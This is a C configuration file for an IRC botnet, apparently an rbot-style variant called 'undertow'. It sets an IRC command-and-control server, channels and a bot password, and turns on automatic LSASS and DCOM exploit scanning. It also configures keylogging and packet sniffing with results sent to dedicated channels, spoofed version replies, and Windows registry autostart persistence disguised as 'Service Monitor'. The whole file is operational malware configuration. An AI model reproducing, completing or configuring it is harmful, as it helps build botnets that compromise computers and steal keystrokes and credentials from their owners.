// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// IRCD PORTS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

int port = 6667;				// server port
int port2 = 6667;				// backup server port

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// TFTP PORT
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

int tftpport = 69;				// Port # for tftp daemon to run on

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// MISC. SETTINGS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL AutoStart = TRUE;			// enable autostart registry keys
int maxrand = 7;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// SCANALL SETTINGS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

SCANALL scanall[]={
{"msass", true}, // msass owns now =)
{"sas", true},
{"dcass", true},
{NULL, false}
};

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// BOT PREFIX
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char prefix = '.';				// command prefix (one character max.)

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// LS1LSASS / CLSASS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char lsaip[] = "";                    // keep blank
char lsaport[] = "5558";
char lsuser[] = "under";
char lspass[] = "t0w";

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// IRCD SERVER SETTINGS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char server[] = "irc.no-server.xxx";		// server
char serverpass[] = "";						// server password
char channel[] = "#no-channel";				// channel that the bot should join
char chanpass[] = "no-password";						// channel password
char server2[] = "irc.no-server.xxx";						// backup server (optional)
char channel2[] = "#no-channel";						// backup channel (optional)
char chanpass2[] = "no-password";						// backup channel password (optional)

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// LOGIN PASSWORD
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char password[] = "password";					// bot password

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// BOT FILENAME SETTINGS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char filename[] = "filen.exe";			// destination file name
BOOL rndfilename = FALSE;				// use random file name
char szLocalPayloadFile[]="filen.exe";	// Payload filename
char keylogfile[] = "yibmd.hnd";				// keylog filename

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// BOT CONFIGURATION
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char botid[] = "undertow";						// bot id
char version[] = "undertow 1.0";		// Bots !version reply
char nickconst[] = "eXp-";					// first part to the bot's nick
char modeonconn[] = "+xi";					// Can be more than one mode and contain both + and -

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// EXPLOIT, LOG, AND SNIFF CHANNELS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char exploitchan[] = "#exploit";					// Channel where exploit messages get redirected
char keylogchan[] = "#keylog";						// Channel where keylog messages get redirected
char psniffchan[] = "#sniff";						// Channel where psniff messages get redirected

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// MASTER HOST
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char *authost[] = {
	"*@*1.2.3.4"
};

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// FAKE VERSION LIST
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char *versionlist[] = {
"Linux 2.4.7",
"Linux 2.6.11",
};

// +-+-+-+-+-+-+-+-+-+-+-+-+-+
// REGISTRY SETTINGS
// +-+-+-+-+-+-+-+-+-+-+-+-+-+

char valuename[] = "Service Monitor";		// value name for autostart
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";




